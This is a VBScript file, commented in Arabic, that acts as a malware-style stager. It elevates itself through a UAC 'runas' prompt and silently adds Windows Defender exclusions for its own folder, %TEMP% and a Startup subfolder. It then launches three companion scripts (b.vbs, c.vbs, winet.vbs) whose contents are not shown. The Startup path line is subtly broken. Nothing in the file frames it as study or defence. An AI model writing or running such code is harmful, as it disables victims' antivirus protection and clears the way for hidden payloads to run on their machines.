If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' تحديد مسار السكربت الحالي
Dim scriptPath
scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' استبدل المسارات التالية بالمسارات التي تريد إضافتها إلى الاستثناءات
Dim exclusionPath1, exclusionPath2, exclusionPath3
exclusionPath1 = scriptPath
exclusionPath2 = objShell.ExpandEnvironmentStrings("%TEMP%") ' استخدام مسار %TEMP%
exclusionPath3 = objShell.ExpandEnvironmentStrings("shell:startup") & "\pp" ' مسار مجلد pp في Startup

' إضافة المسارات إلى قائمة الاستثناءات
objShell.Run "cmd /c powershell -Command Add-MpPreference -ExclusionPath """ & exclusionPath1 & """", 0, True
objShell.Run "cmd /c powershell -Command Add-MpPreference -ExclusionPath """ & exclusionPath2 & """", 0, True
objShell.Run "cmd /c powershell -Command Add-MpPreference -ExclusionPath """ & exclusionPath3 & """", 0, True

' فتح سكريبتين VBS بعد إكمال الإعدادات
Dim vbsPath1, vbsPath2
vbsPath1 = scriptPath & "\b.vbs" ' استبدل Script1.vbs باسم السكربت الأول
vbsPath2 = scriptPath & "\c.vbs" ' استبدل Script2.vbs باسم السكربت الثاني
vbsPath3 = scriptPath & "\winet.vbs" ' استبدل Script2.vbs باسم السكربت الثاني

objShell.Run """" & vbsPath1 & """", 1, False
objShell.Run """" & vbsPath2 & """", 1, False
objShell.Run """" & vbsPath3 & """", 1, False
